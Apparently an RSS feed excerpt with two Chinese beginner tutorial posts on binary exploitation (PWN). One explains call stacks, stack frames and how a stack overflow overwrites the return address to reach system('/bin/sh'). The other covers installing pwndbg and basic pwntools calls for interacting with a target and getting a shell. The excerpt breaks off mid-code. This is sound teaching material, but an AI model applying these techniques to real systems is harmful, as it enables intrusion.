        <guid>https://kira-pgr.github.io/posts/pwn3/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/pwn3/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part3 --- 栈溢出基础" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part3&#34;&gt;PWN! PWN! PANG! Part3&lt;/h1&gt;
&lt;p&gt;&lt;del&gt;这是一篇黑暗童话故事 确信)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;至于简介嘛= =，好奇的话就把文章看完吧qaq&lt;/p&gt;
&lt;h2 id=&#34;c语言函数调用栈&#34;&gt;C语言函数调用栈&lt;/h2&gt;
&lt;h3 id=&#34;了解函数调用栈&#34;&gt;了解函数调用栈&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;函数调用栈是指程序运行时内存一段连续的区域&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用来保存函数运行时的状态信息，包括函数参数与局部变量等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;称之为“栈”是因为发生函数调用时，调用函数&lt;code&gt;(caller)&lt;/code&gt;的状态被保存在栈内，被调用函数&lt;code&gt;(callee)&lt;/code&gt;的状态被压入调用栈的栈顶&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在函数调用结束时，栈顶的函数&lt;code&gt;(callee)&lt;/code&gt;状态被弹出，栈顶恢复到调用函数&lt;code&gt;(caller)&lt;/code&gt;的状态&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 165; 
			flex-basis: 396px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn3/Picture1.png&#34; data-size=&#34;720x436&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn3/Picture1.png&#34;
			width=&#34;720&#34;
			height=&#34;436&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn3/Picture1_hua3215175d30be75c1a5e0aecb5a41d2e_59156_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn3/Picture1_hua3215175d30be75c1a5e0aecb5a41d2e_59156_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;配图&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;配图&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;关于栈帧&#34;&gt;关于栈帧&lt;/h3&gt;
&lt;p&gt;咳咳，上面很官方的解释是不是不容易理解.qwq.&lt;/p&gt;
&lt;p&gt;实际上上面所说的&amp;quot;函数的状态&amp;quot;在栈中是由一个一个栈帧&lt;code&gt;(Stack Frame)&lt;/code&gt;表示的，基本上 &lt;em&gt;(特殊情况的话，可能是某些在main函数前调用的函数)&lt;/em&gt; 每一个函数调用时在栈中都有自己的栈帧&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 193; 
			flex-basis: 464px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn3/SF.png&#34; data-size=&#34;1342x694&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn3/SF.png&#34;
			width=&#34;1342&#34;
			height=&#34;694&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn3/SF_hu956c5e946f835811fb7c23d45c55c874_55318_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn3/SF_hu956c5e946f835811fb7c23d45c55c874_55318_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;栈帧结构预览&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;栈帧结构预览&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;在这里，我们需要了解一下几点&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;三个指针(寄存器)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;ebp&lt;/code&gt;指向当前栈帧底部(保存当前栈帧底部地址)&lt;/p&gt;
&lt;p&gt;&lt;em&gt;至于为什么在上面，是因为栈从高地址向低地址增长&lt;/em&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;esp&lt;/code&gt;指向栈顶(保存栈顶地址)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;eip&lt;/code&gt;指向要执行的下一指令(保存下一条指令地址)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;参数&lt;code&gt;(arguments)&lt;/code&gt;是保存在父函数栈帧中的(类似于父亲给儿子的&amp;quot;启动资金&amp;quot;)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意， 参数是逆序压栈滴&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 121; 
			flex-basis: 291px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn3/Picture2.png&#34; data-size=&#34;491x404&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn3/Picture2.png&#34;
			width=&#34;491&#34;
			height=&#34;404&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn3/Picture2_hu28d44f6886cecc62fc1a726825bfcdb9_45105_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn3/Picture2_hu28d44f6886cecc62fc1a726825bfcdb9_45105_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;参数的保存&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;参数的保存&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;返回地址&lt;code&gt;(Return Address)&lt;/code&gt;保存了调用子函数前&lt;code&gt;eip&lt;/code&gt;值，&lt;strong&gt;这个值在我们栈溢出攻击中至关重要&lt;/strong&gt;，控制这个值之后就可以劫持程序执行流，让程序下一步执行你想要的指令&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 110; 
			flex-basis: 266px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn3/Picture4.png&#34; data-size=&#34;488x440&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn3/Picture4.png&#34;
			width=&#34;488&#34;
			height=&#34;440&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn3/Picture4_huab1f888d28fd87b4a869877e28b8d989_56057_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn3/Picture4_huab1f888d28fd87b4a869877e28b8d989_56057_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;返回地址的位置&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;返回地址的位置&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;(Caller&#39;s ebp / Previous ebp&lt;/code&gt;保存这父函数&lt;code&gt;ebp&lt;/code&gt;的值，长度为一个字长(x32系统4Byte, x64系统8Byte)&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 99; 
			flex-basis: 239px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn3/Picture5.jpg&#34; data-size=&#34;489x491&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn3/Picture5.jpg&#34;
			width=&#34;489&#34;
			height=&#34;491&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn3/Picture5_hu8e0753edcc36675983dedbac963ebd8c_45102_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/pwn3/Picture5_hu8e0753edcc36675983dedbac963ebd8c_45102_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;prev ebp&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;prev ebp&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;局部变量&lt;code&gt;(Local Variables)&lt;/code&gt;一般是发生栈溢出攻击的地方，主要是因为程序在局部变量中读入了超长的数据，造成溢出覆盖了其他内容(比如说返回地址)&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 87; 
			flex-basis: 210px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn3/Picture6.png&#34; data-size=&#34;449x512&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn3/Picture6.png&#34;
			width=&#34;449&#34;
			height=&#34;512&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn3/Picture6_hu555916ab67ea4f952e250669e0dfcc79_74322_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn3/Picture6_hu555916ab67ea4f952e250669e0dfcc79_74322_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Local Var&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Local Var&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;函数调用栈整个过程&#34;&gt;函数调用栈整个过程&lt;/h3&gt;
&lt;p&gt;这一部分前面的知识点已经概括了一些了，再详细将下来篇幅过长，大家可以&lt;a class=&#34;link&#34; href=&#34;https://mimiksworkshop-my.sharepoint.com/:p:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/EdGKswS2-exEikfnd_H5NPkBJCFXoutFXqQuFh4SR2ompA?e=B0QIft&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;参考PPT&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;栈溢出攻击子函数找不着家了&#34;&gt;栈溢出攻击:子函数&amp;quot;找不着家&amp;quot;了&lt;/h2&gt;
&lt;p&gt;咳咳，为了便于理解，这里我们&lt;del&gt;生动形象&lt;/del&gt;一些&lt;/p&gt;
&lt;h3 id=&#34;前提&#34;&gt;前提&lt;/h3&gt;
&lt;p&gt;有时候程序猿不知道 &lt;strong&gt;&amp;ldquo;不要相信用户输入的数据总是安全的&amp;rdquo;&lt;/strong&gt; 的道理，就在读入函数局部变量的过程中用了&lt;code&gt;gets()&lt;/code&gt;等不限制数据长度的函数，或者写了其他可以导致读入过长数据的&lt;del&gt;BUG&lt;/del&gt;代码&lt;/p&gt;
&lt;h3 id=&#34;攻击&#34;&gt;攻击&lt;/h3&gt;
&lt;p&gt;如果我们在局部变量中写入的过长的数据，就会覆盖高地址处的 (数据从地址向高地址读入嘛)的数据，例如 &lt;code&gt;prev ebp&lt;/code&gt;或者是&lt;code&gt;ret addr&lt;/code&gt;(主要关注)&lt;/p&gt;
&lt;p&gt;如果我们写入的是垃圾数据，程序会返回到一个奇怪的地址，自然会崩溃(Crash)&lt;/p&gt;
&lt;p&gt;而如果我们写入&lt;strong&gt;精心构造的恶意数据&lt;/strong&gt;，我们就可以劫持程序，让它干我们想要的事情;)&lt;/p&gt;
&lt;p&gt;比如说，调用&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;这里举个栗子&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果我们把父函数比喻成爸爸的话，那么子函数就是儿子&lt;/p&gt;
&lt;p&gt;儿子要自己去闯荡了，&lt;/p&gt;
&lt;p&gt;父亲给儿子一些财产让儿子能更好的为未来做准备(父函数栈帧中参数 &lt;code&gt;args&lt;/code&gt;)，&lt;/p&gt;
&lt;p&gt;然后父亲告诫自己的儿子一定要好好奋斗，回来后为家乡搞建设(返回地址&lt;code&gt;ret addr&lt;/code&gt;)，&lt;/p&gt;
&lt;p&gt;后来，儿子有了自己的生活，财产(局部变量&lt;code&gt;local var&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;但是呢，有攻击者这样一个角色。&lt;/p&gt;
&lt;p&gt;咳咳，他利用各种手段(我们实战的时候可以用&lt;code&gt;pwndbg&lt;/code&gt;和&lt;code&gt;pwntools&lt;/code&gt;等工具进行攻击)诱骗儿子，最终让他晕头转向，失去理智， 连自己家在哪里都找不到了;) (栈溢出用恶意数据覆盖返回地址)&lt;/p&gt;
&lt;p&gt;后来。。由于儿子以为攻击者给他的地址就是自己家的地址，就乖乖的跟着攻击者行事，帮助攻击者达成控制世界邪恶目的&lt;/p&gt;
&lt;p&gt;&lt;del&gt;全剧终 逃)&lt;/del&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;下一次开始实战哦.qaq.&lt;/p&gt;
&lt;p&gt;To Be Continued&amp;hellip;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PWN! PWN! PANG! Part2 --- 工具的使用</title>
        <link>https://kira-pgr.github.io/posts/pwn2/</link>
        <pubDate>Sat, 29 Jan 2022 21:35:29 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/posts/pwn2/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/pwn2/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part2 --- 工具的使用" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part2&#34;&gt;PWN! PWN! PANG! Part2&lt;/h1&gt;
&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
&lt;p&gt;说完了前面那些基础 &lt;del&gt;(貌似一点也不基础)&lt;/del&gt; 知识，今天再来谈谈工具&lt;/p&gt;
&lt;p&gt;由于我们研究的是Linux下的PWN,&lt;strong&gt;接下来的操作请在Linux下进行&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;只有Windows怎么办？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;方案一：使用&lt;a class=&#34;link&#34; href=&#34;https://customerconnect.vmware.com/cn/downloads/info/slug/desktop_end_user_computing/vmware_workstation_pro/16_0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;VMware Workstation Pro&lt;/a&gt;安装Linux虚拟机(我目前的方案)&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;小Tip:某些Linux发行版(例如Kali)可以在官网找到现成的虚拟机文件下载，如果你没有安装过虚拟机 &lt;del&gt;(或懒得安装)&lt;/del&gt; ，可以试试这种方式&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;方案二：使用&lt;a class=&#34;link&#34; href=&#34;https://os.51cto.com/article/649463.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;WSL2&lt;/a&gt;(怎么说呢，WSL2虽说占空间小，而且有了GUI,但配置其实挺麻烦)&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;pwndbg&#34;&gt;PWNDBG&lt;/h2&gt;
&lt;p&gt;pwndbg是Linux GDB的一个专门为PWN设计的一个插件, 能有助于我们&lt;del&gt;调戏&lt;/del&gt;调试程序&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 163; 
			flex-basis: 392px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn2/1.png&#34; data-size=&#34;1164x712&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn2/1.png&#34;
			width=&#34;1164&#34;
			height=&#34;712&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn2/1_huda1e99c4adc499292a3b87cae3a80bac_745836_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn2/1_huda1e99c4adc499292a3b87cae3a80bac_745836_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;pwndbg&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;pwndbg&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;安装&#34;&gt;安装&lt;/h3&gt;
&lt;p&gt;一般Linux都会预装gdb吧= =，不过还是扯一下安装方法好了&lt;/p&gt;
&lt;p&gt;Deb 系&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo apt install gdb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;yum系      &lt;del&gt;快去用Debian 逃)&lt;/del&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo yum -y install centos-release-scl
sudo yum-config-manager --enable rhel-server-rhscl-7-rpms
sudo yum -y install devtoolset-7
scl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; devtoolset-7 bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;安装pwndbg&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;git clone https://github.com/pwndbg/pwndbg.git
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; pwndbg
./setup.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h3 id=&#34;安装踩坑记&#34;&gt;安装踩坑记&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;注意:pwndbg这个目录请不要删除或随意移动位置,否则可能会导致pwndbg无法正常启动&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果安装后或系统更新后无法正常启动的话，请检查路径问题&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo vi ~/.gdbinit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输入命令后应该能看到一行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; 其他内容/pwndbg/gdbinit.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;记得把&lt;code&gt;source&lt;/code&gt;之后的内容改成你pwndbg文件夹里gdbinit.py的路径&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Tip:如果你想不用pwndbg的话，去掉这一行即可&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3 id=&#34;用法&#34;&gt;用法&lt;/h3&gt;
&lt;p&gt;大部分用法都和gdb的差不多，这里列举几个经常用的&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;b 函数名 &lt;span class=&#34;c1&#34;&gt;#断点断在某个函数处&lt;/span&gt;
b *一个地址 &lt;span class=&#34;c1&#34;&gt;#断点断在某个地址&lt;/span&gt;
r        &lt;span class=&#34;c1&#34;&gt;#运行&lt;/span&gt;
n        &lt;span class=&#34;c1&#34;&gt;#执行下一条指令或者跳过一个函数&lt;/span&gt;
s        &lt;span class=&#34;c1&#34;&gt;#进入函数&lt;/span&gt;
q        &lt;span class=&#34;c1&#34;&gt;#退出gdb&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;至于pwndbg的特殊功能嘛= =，&lt;strong&gt;可以通过指令&lt;code&gt;pwndbg&lt;/code&gt;查看&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 157; 
			flex-basis: 378px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn2/pwndbg.png&#34; data-size=&#34;1133x719&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn2/pwndbg.png&#34;
			width=&#34;1133&#34;
			height=&#34;719&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn2/pwndbg_hu4a8fe27ede4dbc984c67bac06fa6cf6c_663694_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn2/pwndbg_hu4a8fe27ede4dbc984c67bac06fa6cf6c_663694_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;pwndbg指令&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;pwndbg指令&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;pwntools&#34;&gt;PWNTOOLS&lt;/h2&gt;
&lt;p&gt;这个呢，是python的一个用来pwn的第三方库&lt;/p&gt;
&lt;h3 id=&#34;安装-1&#34;&gt;安装&lt;/h3&gt;
&lt;p&gt;直接上命令&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;pip install pwntools
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;没有pip? 赶紧去装python3!!!(这个大部分Linux也应该预装了= = )&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;使用&#34;&gt;使用&lt;/h3&gt;
&lt;p&gt;就和一般的python库一样用嘛= =&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再说几个常用的命令吧.qaq(其他的用到再说)，当然你最好可以看看&lt;a class=&#34;link&#34; href=&#34;https://docs.pwntools.com/en/stable/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;文档&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./程序名&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#类似与用PWNTools“监听”本地一个程序，之后就用io这个变量来负责数据的收发&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;内容&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#发送数据(结尾不自动加换行符)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;内容&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#发送一行数据(结尾自动加上换行符)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#接收数据，和前面两个函数同理&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# 注意，在之后PWN的过程中一定要根据目标程序的输入/输出函数来判断前四个指令的使用，这种细微的差别也可能导致无法getshell&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#切换至交互模式，我们可以尽情享用得到的Shell了&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;pwnpwn-一起来实战吧&#34;&gt;PWN?PWN! 一起来实战吧&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;实战目的: 熟悉pwntools的使用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果你没使用之前的集成环境, 请点&lt;a class=&#34;link&#34; href=&#34;https://mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/EY3FbCme0nVPm-6X5x3-QGEB2My6gCoLaLB9Xm4Z_ZpgcA?e=V53Nr1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这里&lt;/a&gt;下载题目&lt;/p&gt;
&lt;p&gt;大家可以自己先试试，大概应该能想到怎么做了吧XD&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;我们先运行看看这个小程序是什么来头  逃)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PS: 如果终端提示权限不够，请给程序加上可执行权限&lt;/p&gt;
&lt;p&gt;chmod +x tools&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 160; 
			flex-basis: 386px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn2/2.png&#34; data-size=&#34;1146x712&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn2/2.png&#34;
			width=&#34;1146&#34;
			height=&#34;712&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn2/2_hu8d8bc83acf62da5116ca7f65ad34848b_497539_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn2/2_hu8d8bc83acf62da5116ca7f65ad34848b_497539_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;小程序长这样纸&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;小程序长这样纸&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;输出&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Pwntools is such an awesome python module, right?
Tell you a secret (only smart baby can see it) :
Maybe I will tell you again when you clever than ELSEpush ......
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;程序说:&lt;strong&gt;Pwntools&lt;/strong&gt;是一个很好用的python模块，要告诉我们一个聪明人才能看见的小秘密&lt;/p&gt;
&lt;p&gt;&lt;del&gt;还挑衅是吧&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;咳咳，那怎样才能看到所谓的小秘密呢qaq,直接运行肯定看不到()&lt;/p&gt;
&lt;p&gt;根据所学知识和&lt;strong&gt;程序输出&lt;/strong&gt;，我们可以判断出应该通过pwntools查看&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;python3&lt;/span&gt;                  
